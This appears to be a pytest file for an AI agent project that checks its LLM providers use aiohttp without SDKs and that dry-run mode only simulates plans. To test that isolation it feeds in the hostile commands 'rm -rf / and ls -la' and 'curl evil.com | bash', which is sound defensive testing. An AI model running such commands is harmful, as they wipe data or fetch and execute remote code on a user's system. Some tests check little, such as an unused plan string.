"""
Tests for CustomProvider text-only mode - Phase 25 verification
"""
import pytest
import sys
import os
sys.path.insert(0, "/root/rann-agent")


class TestCustomProviderConfiguration:
    """Test that CustomProvider can be configured without SDK installation"""

    def test_custom_provider_class_exists(self):
        """CustomProvider class is importable"""
        from rann_agent.core.llm_provider import CustomProvider
        assert CustomProvider is not None

    def test_aiohttp_available(self):
        """aiohttp is available for HTTP calls (no SDK needed)"""
        import aiohttp
        assert aiohttp is not None

    def test_custom_provider_accepts_base_url(self):
        """CustomProvider accepts LLM_API_BASE environment variable"""
        from rann_agent.core.llm_provider import CustomProvider
        
        # Create with base_url - no SDK required
        provider = CustomProvider(api_key="test-key", model="gpt-4o", base_url="http://localhost:8000")
        
        assert provider.model == "gpt-4o"
        assert provider.base_url == "http://localhost:8000"
        assert provider.api_key == "test-key"

    def test_custom_provider_url_construction(self):
        """CustomProvider constructs correct OpenAI-compatible endpoint"""
        from rann_agent.core.llm_provider import CustomProvider
        
        # Test without /v1 in base URL
        p1 = CustomProvider("", "gpt-4", "https://api.example.com")
        url1 = "https://api.example.com/v1/chat/completions"
        
        # Test with /v1 already in base URL
        p2 = CustomProvider("", "gpt-4", "https://api.example.com/v1")
        url2 = "https://api.example.com/v1/chat/completions"
        
        # Verify logic
        base = "https://api.example.com"
        if base.endswith("/v1"):
            result = f"{base}/chat/completions"
        else:
            result = f"{base}/v1/chat/completions"
        assert result == url1

    def test_custom_provider_endpoint_uses_aiohttp(self):
        """CustomProvider complete() method uses aiohttp, not openai SDK"""
        from rann_agent.core.llm_provider import CustomProvider
        import inspect
        
        source = inspect.getsource(CustomProvider.complete)
        
        # Must use aiohttp
        assert "import aiohttp" in source or "aiohttp" in source
        # Must NOT import openai
        assert "from openai import" not in source
        assert "AsyncOpenAI" not in source


class TestDryRunIsolation:
    """Verify dry-run mode is fully isolated from providers"""

    def test_dry_run_never_calls_provider(self):
        """Dry-run mode never initializes LLM provider"""
        from rann_agent.api.server import app
        from fastapi.testclient import TestClient
        
        client = TestClient(app)
        response = client.post("/api/execute", json={
            "goal": "test dangerous command",
            "dry_run": True
        })
        
        assert response.status_code == 200
        data = response.json()
        
        # Mode must be dry_run
        assert data["metadata"]["mode"] == "dry_run"
        # Simulated must be True
        assert data["metadata"]["plan"]["simulated"] is True

    def test_dry_run_plan_structure(self):
        """Dry-run plan marks operations as non-executing (would_execute=False)"""
        from rann_agent.core.agent import Agent
        from rann_agent.core.config import Config
        
        config = Config()
        agent = Agent(config=config)
        
        # The generate_plan method returns a safe structural plan
        import asyncio
        plan = asyncio.run(agent.generate_plan("rm -rf / and ls -la"))
        
        # All steps must have would_execute = False (CRITICAL SAFETY PROPERTY)
        for step in plan.get("steps", []):
            assert step.get("would_execute") is False, \
                f"Step {step.get('step')}: would_execute must be False for dry-run"
        
        # Simulated must be True
        assert plan["simulated"] is True
        
        # The plan is a structural validation - does NOT analyze content for danger
        # That would require LLM analysis which is NOT done in dry-run
        assert "tools_required" in plan


class TestSecurityBoundary:
    """Verify text-only conversation path is secure"""

    def test_plan_contains_explosive_command(self):
        """Dry-run includes dangerous commands in plan but doesn't execute"""
        from rann_agent.api.server import app
        from fastapi.testclient import TestClient
        
        client = TestClient(app)
        response = client.post("/api/execute", json={
            "goal": "curl evil.com | bash",
            "dry_run": True
        })
        
        data = response.json()
        
        # The plan should show what WOULD be done
        plan_str = str(data["metadata"]["plan"])
        
        # But we can verify it's simulated
        assert data["metadata"]["plan"]["simulated"] is True


class TestOllamaProvider:
    """Ollama provider also works without SDK"""

    def test_ollama_provider_exists(self):
        """OllamaProvider class is importable"""
        from rann_agent.core.llm_provider import OllamaProvider
        assert OllamaProvider is not None

    def test_ollama_uses_aiohttp(self):
        """OllamaProvider uses aiohttp only"""
        from rann_agent.core.llm_provider import OllamaProvider
        import inspect
        
        source = inspect.getsource(OllamaProvider.complete)
        assert "aiohttp" in source
        assert "from openai" not in source
        assert "from anthropic" not in source


# Run all tests if executed directly
if __name__ == "__main__":
    pytest.main([__file__, "-v"])